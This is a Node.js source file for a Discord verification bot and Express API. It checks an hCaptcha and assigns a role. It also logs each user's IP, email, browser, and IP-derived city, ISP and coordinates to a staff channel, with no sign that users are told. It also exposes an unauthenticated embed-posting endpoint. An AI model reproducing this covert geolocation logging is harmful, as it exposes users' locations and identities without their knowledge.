require("dotenv").config();
const { Client, GatewayIntentBits } = require("discord.js");
const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");
const sendVerificationEmbed = require("./utils/sendVerificationEmbed");

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers]
});

// load events
require("./events/guildMemberAdd")(client);

const app = express();
app.set("trust proxy", true);
app.use(cors({ origin: process.env.SITE_ORIGIN || "https://javelin.asia" }));
app.use(express.json());

// --- utils ---
function getClientIp(req) {
  const xf = (req.headers["x-forwarded-for"] || "").split(",")[0].trim();
  return xf || req.ip || "";
}

async function geoFromIp(ip) {
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`);
    if (!r.ok) return null;
    return await r.json();
  } catch {
    return null;
  }
}

// Vérification hCaptcha
async function verifyHCaptcha(token, ip) {
  const params = new URLSearchParams();
  params.append("response", token);
  params.append("secret", process.env.HCAPTCHA_SECRET);
  if (ip) params.append("remoteip", ip);

  const r = await fetch("https://hcaptcha.com/siteverify", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: params.toString(),
  });
  const j = await r.json();
  return !!j.success;
}

// --- routes ---
// verify endpoint
app.post("/api/verify", async (req, res) => {
  const { userId, secret, captchaToken } = req.body;
  if (secret !== process.env.API_SECRET) {
    return res.status(403).json({ success: false, error: "Unauthorized" });
  }

  try {
    // vérif captcha
    const ip = getClientIp(req);
    const captchaOK = await verifyHCaptcha(captchaToken, ip);
    if (!captchaOK) {
      return res.status(400).json({ success: false, error: "Captcha failed" });
    }

    const guild = client.guilds.cache.get(process.env.GUILD_ID);
    const member = await guild.members.fetch(userId);
    const role = guild.roles.cache.get(process.env.ROLE_ID);

    if (role && member) {
      await member.roles.add(role);

      // géo infos
      const geo = await geoFromIp(ip);

      // log
      const channel = guild.channels.cache.get(process.env.LOGS_CHANNEL_ID);
      if (channel) {
        await sendVerificationEmbed(channel, member, {
          email: req.body.email,
          emailVerified: "true",
          locale: req.body.locale || "N/A",
          twoFA: "false",
          ip,
          browser: req.headers["user-agent"],
          registered: req.body.registered || "N/A",
          country: geo?.country_name,
          region: geo?.region,
          city: geo?.city,
          isp: geo?.org,
          premium: req.body.premium || "None",
          badges: req.body.badges || "None",
          lat: geo?.latitude,
          lon: geo?.longitude,
        });
      }

      return res.json({ success: true });
    } else {
      return res.json({ success: false, error: "Role or member not found" });
    }
  } catch (err) {
    console.error(err);
    return res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// send embed endpoint (optionnel)
app.post("/api/sendEmbed", async (req, res) => {
  const { userId, ...data } = req.body;
  try {
    const guild = client.guilds.cache.get(process.env.GUILD_ID);
    const member = await guild.members.fetch(userId);
    const channel = guild.channels.cache.get(process.env.LOGS_CHANNEL_ID);

    if (!channel) return res.status(404).json({ error: "Channel not found" });

    await sendVerificationEmbed(channel, member, data);
    res.json({ success: true });
  } catch (err) {
    console.error("Error sending embed:", err);
    res.status(500).json({ success: false });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Hebi API running on port ${PORT}`));

client.once("ready", () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.login(process.env.DISCORD_TOKEN);
